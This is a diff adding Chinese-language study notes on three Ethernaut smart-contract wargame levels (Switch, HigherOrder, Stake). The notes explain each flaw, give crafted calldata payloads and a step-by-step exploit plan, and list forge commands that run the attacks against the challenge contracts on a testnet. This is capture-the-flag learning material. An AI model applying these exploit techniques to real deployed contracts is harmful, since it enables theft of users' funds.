@@ -944,4 +944,111 @@ forge script  --rpc-url https://1rpc.io/holesky script/ethernaut/gatekeeper_thre
 
 ### 2024.09.14
 
+#### 29. Switch
+
+calldatacopy用于将calldata复制到内存中，函数第一个参数表示内存存储位置，第二个参数用于设置要复制的calldata的偏移量，最后一个参数定义要复制数据的大小，在这个合约中分别是(selector, 68, 4)
+最后检查复制到selector数组中的第一个index的值是不是`turnSwitchOff`函数的函数选择器
+为了将switchOn变量设置为true，需要在calldata中传递`turnSwitchOn`函数的函数选择器
+
+组装calldata，内含3个函数选择器：
+1. `func flipSwitch(bytes memory _data)` - 0x30c13ade 命令`cast sig "flipSwitch(bytes memory _data)"`
+2. `func turnSwitchOff()` - 0x20606e15  命令`cast sig "turnSwitchOff()"`
+3. `func turnSwitchOn()` - 0x76227e12 命令 `cast sig "turnSwitchOn()"`
+
+onlyOff要求calldata的偏移量为64bytes，值为0x20606e15
+
+传入turnSwitchOff，slot 40位于(4+32+32=68)bytes，满足onlyOff的要求
+``` bash
+    30c13ade                                                         -> func flipSwitch(bytes memory _data) selector
+00: 0000000000000000000000000000000000000000000000000000000000000020 -> 由于bytes是动态类型，因此它可以消耗任意数量的32bytes，为了避免与传递到该函数的其他参数发生溢出和冲突，该slot实际上是指向可以找到具体bytes值的calldata slot的指针。此处，ABI 要求前往slot 20查找实际bytes值
+20: 0000000000000000000000000000000000000000000000000000000000000004 -> 这是实际bytes的开始。由于bytes也是变长类型，因此该slot表示实际字节的长度。在本例中，它表示该值有4个bytes大
+40: 20606e1500000000000000000000000000000000000000000000000000000000 -> 这是我们传递给函数的字节，从前一个slot中，程序知道了要取4bytes返回给_data。在本例中，程序将_data设置为20606e15
+```
+
+传入turnSwitchOn
+``` bash
+    30c13ade                                                         -> func flipSwitch(bytes memory _data) selector
+00: 0000000000000000000000000000000000000000000000000000000000000060 -> 与之前相同意思，但告诉程序要跳转到slot 60，而不是slot 20，也就是从此处偏移96个字节(32x3)
+20: 0000000000000000000000000000000000000000000000000000000000000000 -> slot 20上不需要存储字节长度，空填充
+40: 20606e1500000000000000000000000000000000000000000000000000000000 -> 仍旧保留 20606e15 用来欺骗onlyOff
+60: 0000000000000000000000000000000000000000000000000000000000000004 -> 这是实际bytes的开始，表示该值有4个bytes大
+80: 76227e1200000000000000000000000000000000000000000000000000000000 -> 这是我们传递给函数的字节，从前一个slot中，程序知道了要取4bytes返回给_data。在本例中，程序将_data设置为76227e12
+```
+
+可直接传入上述calldata或使用下面的encodeWithSignature，都一样
+``` bash
+bytes memory data = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
+
+bytes memory data = abi.encodeWithSignature(
+    "flipSwitch(bytes)",
+    bytes32(uint256(96)),
+    bytes32(""),
+    bytes4(keccak256("turnSwitchOff()")),
+    bytes32(uint256(4)),
+    bytes4(keccak256("turnSwitchOn()"))
+);
+```
+
+编写攻击合约[switch_hack.sol](Writeup/awmpy/src/ethernaut/switch_hack.sol)
+编写攻击脚本[switch_hack.s.sol](Writeup/awmpy/script/ethernaut/switch_hack.s.sol)，其中合约地址使用ethernaut提供的合约地址
+
+执行脚本发起攻击
+
+``` bash
+forge script  --rpc-url https://1rpc.io/holesky script/ethernaut/switch_hack.s.sol:SwitchHackScript -vvvv --broadcast
+```
+
+#### 30. HigherOrder
+
+EVM不知道数据类型是什么，这些是 Solidity 发明和强制执行的概念
+
+指定uint8作为`registerTreasury`函数的输入参数类型会对calldata强制实施最大大小限制，但事实并非如此，使用低级汇编意味着关闭 Solidity 中的正常保护措施
+
+在这种情况下，这意味着不再对传递给函数的 calldata 进行类型检查, EVM 看到的所有内容都是在调用数据中传递的原始字节
+
+所以直接调用`registerTreasury`并传入大于255 uint的calldata即可
+
+从solc版本0.8.0开始，默认启用ABI coder v2，此更改添加了保护措施，以实际检查输入类型，如果solc版本>0.8.0，这个交易会被拒绝
+
+合约会将`msg.sender`设置为`commander`，所以应该直接用脚本调用合约，不能通过攻击合约来，否则`commander`会被设置为攻击合约地址
+
+编写攻击脚本[higher_order_hack.s.sol](Writeup/awmpy/script/ethernaut/higher_order_hack.s.sol)，其中合约地址使用ethernaut提供的合约地址
+
+执行脚本发起攻击
+
+``` bash
+forge script  --rpc-url https://1rpc.io/holesky script/ethernaut/higher_order_hack.s.sol:HigherOrderHackScript -vvvv --broadcast
+```
+
+#### 31. Stake
+
+这一关是一个质押合约，需要找到其中的漏洞并满足题目给出的条件：
+1. `Stake`合约的ETH余额必须大于0
+2. `totalStaked`必须大于`Stake`合约的ETH余额
+3. player必须是质押者
+4. player的质押余额必须为0
+
+漏洞分析：
+漏洞存在于`StackWETH`函数中，合约调用了WETH的`0xdd62ed3e[allowance(address,address)]`和`0x23b872dd[transferFrom(address,address,uint256)]`两个函数
+在调用第二个函数时返回了一个`transfered`，但在合约中没有对`transfered`的值做判断，也就是说当`transfered`为false代表了转账失败，但合约不会revert，我们可以在没有WETH的情况下直接调用`StackWETH`函数
+
+攻击思路：
+1. 使用EOA账户直接调用`StackETH`发送(0.001 ether + 1)，再调用`Unstake`函数解押(0.001 ether + 1)ETH，这样我们成为了质押者且质押余额为0，满足了条件3和4
+2. 使用攻击合约调用"DummyWETH"合约的`approve`函数授权一些额度来通过`allowance`校验
+3. 使用攻击合约调用`StackWETH`发送(amount=0.001 ether + 1)来将`totalStacked`增加amount，这样就可以满足条件2
+4. 使用攻击合约调用`StackETH`发送(0.001 ether + 1)，再调用`Unstack`函数解押(0.001 ether)的ETH，要留1 wei在合约内来满足条件1
+5. 把攻击合约`destruct()`掉，把攻击所使用的0.001 ether再转回给EOA
+
+编写攻击合约[stake_hack.sol](Writeup/awmpy/src/ethernaut/stake_hack.sol)
+编写攻击脚本[stake_hack.s.sol](Writeup/awmpy/script/ethernaut/stake_hack.s.sol)，其中合约地址使用ethernaut提供的合约地址，weth地址通过console执行`await contract.WETH();`查询
+
+执行脚本发起攻击
+这一次需要加上`--evm-version cancun`来指定evm版本，否则会报错`[NotActivated] EvmError: NotActivated`
+
+``` bash
+forge script  --rpc-url https://1rpc.io/holesky script/ethernaut/stake_hack.s.sol:StakeHackScript --evm-version cancun -vvvv --broadcast
+```
+
+### 2024.09.15
+
 <!-- Content_END -->
